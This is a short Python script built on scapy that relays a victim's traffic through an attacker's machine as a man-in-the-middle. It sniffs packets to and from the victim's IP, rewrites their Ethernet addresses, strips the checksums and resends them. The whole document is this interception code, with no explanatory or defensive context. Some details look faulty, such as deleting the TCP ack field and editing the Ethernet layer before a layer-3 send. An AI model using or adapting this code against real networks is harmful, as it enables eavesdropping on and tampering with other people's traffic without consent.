import sys
from scapy.all import *

__author__ = 'checkout'

victim=sys.argv[1]
victimMac=sys.argv[2]
attacker=sys.argv[3]
attackerMac=sys.argv[4]
realGateway=sys.argv[5]
counter=0

print("victimIP " + victim + " victimMAC " + victimMac + " attacker " + attacker + " attackerMAC " + attackerMac + " Real Gateway " + realGateway)


def mitm(packet):

		if packet.haslayer(IP):

			ether = packet.getlayer(Ether)
			ether.src = attackerMac

			# host-to-gateway
			if packet[IP].src == victim:
				ether.dst = realGateway

			# gateway-to-host
			elif packet[IP].dst == victim:
				ether.dst = victimMac

			else:
				return

			del packet[IP].chksum
			if packet.haslayer(UDP):
				del packet[UDP].chksum
				del packet[UDP].len
			elif packet.haslayer(TCP):
				del packet[TCP].chksum
				del packet[TCP].ack


			send(packet)


sniff(filter='(src %s) or (dst %s)' % (victim, victim), prn=lambda x: mitm(x))